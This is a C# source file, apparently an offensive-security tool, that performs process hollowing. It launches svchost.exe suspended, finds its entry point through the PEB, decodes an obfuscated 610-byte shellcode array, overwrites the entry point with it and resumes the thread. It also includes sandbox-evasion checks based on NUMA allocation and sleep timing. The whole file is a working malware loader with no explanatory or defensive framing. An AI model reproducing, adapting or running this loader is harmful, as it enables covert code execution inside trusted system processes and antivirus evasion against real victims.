using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static Hollow.Program;

namespace Hollow
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,uint ProcInfoLen, ref uint retlen);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,[Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,Int32 nSize,out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,[MarshalAs(UnmanagedType.AsAny)] object lpBuffer,int dwSize,out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            byte[] uHWLfWVQ = new byte[610]{0xa2, 0x16, 0x5b, 0xba, 0xae, 0xb6, 0x92, 0xde, 0xde, 0xde, 0x19, 0x09, 0x19, 0x0e, 0x08, 0x16, 0xe9, 0x88, 0x09, 0x04, 0x35, 0x16, 0x53, 0x08, 0x3e, 0x16, 0x53, 0x08, 0xc6, 0x16, 0x53, 0x08, 0xfe, 0x16, 0xcf, 0x67, 0x10, 0x10, 0x0d, 0xe9, 0x91, 0x16, 0x53, 0x28, 0x0e, 0x16, 0xe9, 0x9e, 0x72, 0xe2, 0x39, 0x22, 0xd8, 0xf2, 0xfe, 0x19, 0x99, 0x91, 0xcd, 0x19, 0xd9, 0x99, 0xb8, 0xad, 0x08, 0x16, 0x53, 0x08, 0xfe, 0x53, 0x18, 0xe2, 0x16, 0xd9, 0x8e, 0x34, 0x59, 0x26, 0xc6, 0xd3, 0xd8, 0x19, 0x09, 0xcf, 0x55, 0x28, 0xde, 0xde, 0xde, 0x53, 0x5e, 0x56, 0xde, 0xde, 0xde, 0x16, 0x55, 0x9e, 0x2a, 0x37, 0x16, 0xd9, 0x8e, 0x1a, 0x53, 0x1e, 0xfe, 0x0e, 0x53, 0x16, 0xc6, 0x11, 0xd9, 0x8e, 0xbb, 0x04, 0x16, 0xdf, 0x91, 0x19, 0x53, 0xea, 0x56, 0x16, 0xd9, 0x84, 0x0d, 0xe9, 0x91, 0x16, 0xe9, 0x9e, 0x72, 0x19, 0x99, 0x91, 0xcd, 0x19, 0xd9, 0x99, 0xe6, 0xbe, 0x25, 0xa9, 0x12, 0xdb, 0x12, 0xfa, 0xd6, 0x15, 0xe1, 0x89, 0x25, 0x86, 0x06, 0x1a, 0x53, 0x1e, 0xfa, 0x11, 0xd9, 0x8e, 0x34, 0x19, 0x53, 0xd2, 0x16, 0x1a, 0x53, 0x1e, 0xc2, 0x11, 0xd9, 0x8e, 0x19, 0x53, 0xda, 0x56, 0x16, 0xd9, 0x8e, 0x19, 0x06, 0x19, 0x06, 0x3c, 0x01, 0x00, 0x19, 0x06, 0x19, 0x01, 0x19, 0x00, 0x16, 0x5b, 0xb2, 0xfe, 0x19, 0x08, 0xdf, 0xbe, 0x06, 0x19, 0x01, 0x00, 0x16, 0x53, 0xc8, 0xb1, 0x13, 0xdf, 0xdf, 0xdf, 0x3d, 0x16, 0xe9, 0x83, 0x0b, 0x11, 0x9c, 0x27, 0x31, 0x2c, 0x31, 0x2c, 0x35, 0x2a, 0xde, 0x19, 0x04, 0x16, 0x51, 0xb9, 0x11, 0x97, 0x98, 0x12, 0x27, 0xf4, 0xd7, 0xdf, 0x85, 0x0b, 0x0b, 0x16, 0x51, 0xb9, 0x0b, 0x00, 0x0d, 0xe9, 0x9e, 0x0d, 0xe9, 0x91, 0x0b, 0x0b, 0x11, 0x60, 0xe0, 0x04, 0x21, 0x77, 0xde, 0xde, 0xde, 0xde, 0xdf, 0x85, 0xb6, 0xcf, 0xde, 0xde, 0xde, 0xe9, 0xe1, 0xe8, 0xec, 0xe9, 0xe4, 0xe6, 0xec, 0xea, 0xe1, 0xec, 0xe9, 0xe8, 0xe8, 0xde, 0x00, 0x16, 0x51, 0x99, 0x11, 0x97, 0x9e, 0x63, 0xd9, 0xde, 0xde, 0x0d, 0xe9, 0x91, 0x0b, 0x0b, 0x30, 0xdb, 0x0b, 0x11, 0x60, 0x07, 0x51, 0x7f, 0x94, 0xde, 0xde, 0xde, 0xde, 0xdf, 0x85, 0xb6, 0xe6, 0xde, 0xde, 0xde, 0xef, 0xe9, 0x29, 0x19, 0x0b, 0x01, 0x38, 0x3b, 0xe8, 0x04, 0x1b, 0xee, 0xee, 0x01, 0x20, 0x04, 0x36, 0x05, 0x13, 0x0c, 0x09, 0x39, 0x27, 0x13, 0x2d, 0xe8, 0x10, 0x18, 0x1b, 0x04, 0x3f, 0x0b, 0x11, 0x17, 0x3f, 0x0a, 0x33, 0xe5, 0x13, 0x30, 0x0d, 0x01, 0x25, 0x14, 0x32, 0xe7, 0xeb, 0xe1, 0x25, 0x09, 0xe1, 0x30, 0x38, 0xe6, 0x31, 0xde, 0x16, 0x51, 0x99, 0x0b, 0x00, 0x19, 0x06, 0x0d, 0xe9, 0x91, 0x0b, 0x16, 0x66, 0xde, 0xe8, 0x76, 0x5a, 0xde, 0xde, 0xde, 0xde, 0x0e, 0x0b, 0x0b, 0x11, 0x97, 0x98, 0xb3, 0x05, 0xec, 0xe3, 0xdf, 0x85, 0x16, 0x51, 0x94, 0x30, 0xd0, 0x3f, 0x16, 0x51, 0xa9, 0x30, 0xff, 0x00, 0x08, 0x36, 0x5e, 0xeb, 0xde, 0xde, 0x11, 0x51, 0xbe, 0x30, 0xda, 0x19, 0x01, 0x11, 0x60, 0x25, 0x14, 0x7c, 0x54, 0xde, 0xde, 0xde, 0xde, 0xdf, 0x85, 0x0d, 0xe9, 0x9e, 0x0b, 0x00, 0x16, 0x51, 0xa9, 0x0d, 0xe9, 0x91, 0x0d, 0xe9, 0x91, 0x0b, 0x0b, 0x11, 0x97, 0x98, 0xed, 0xd4, 0xc6, 0x23, 0xdf, 0x85, 0x55, 0x9e, 0x25, 0xff, 0x16, 0x97, 0x99, 0x56, 0xcb, 0xde, 0xde, 0x11, 0x60, 0x1a, 0xae, 0xe5, 0xbe, 0xde, 0xde, 0xde, 0xde, 0xdf, 0x85, 0x16, 0xdf, 0x8f, 0x2a, 0xd8, 0xb3, 0x70, 0xb6, 0x05, 0xde, 0xde, 0xde, 0x0b, 0x01, 0x30, 0x1e, 0x00, 0x11, 0x51, 0x89, 0x99, 0xb8, 0xce, 0x11, 0x97, 0x9e, 0xde, 0xce, 0xde, 0xde, 0x11, 0x60, 0x06, 0x7a, 0x0b, 0xb5, 0xde, 0xde, 0xde, 0xde, 0xdf, 0x85, 0x16, 0x4b, 0x0b, 0x0b, 0x16, 0x51, 0xb7, 0x16, 0x51, 0xa9, 0x16, 0x51, 0x80, 0x11, 0x97, 0x9e, 0xde, 0xfe, 0xde, 0xde, 0x11, 0x51, 0xa1, 0x11, 0x60, 0xc8, 0x44, 0x51, 0xb8, 0xde, 0xde, 0xde, 0xde, 0xdf, 0x85, 0x16, 0x5b, 0x9a, 0xfe, 0x55, 0x9e, 0x2a, 0x68, 0x34, 0x53, 0xd7, 0x16, 0xd9, 0x9b, 0x55, 0x9e, 0x25, 0x88, 0x06, 0x9b, 0x06, 0x30, 0xde, 0x01, 0x11, 0x97, 0x98, 0xae, 0x65, 0x78, 0x04, 0xdf, 0x85};

            for (int i = 0; i < uHWLfWVQ.Length; i++)
            {
                uHWLfWVQ[i] = (byte)((((uint)uHWLfWVQ[i] ^ 157) -67 ) & 0xFF );
            }
            WriteProcessMemory(hProcess, addressOfEntryPoint, uHWLfWVQ, uHWLfWVQ.Length, out nRead);
            ResumeThread(pi.hThread);
        }
    }
}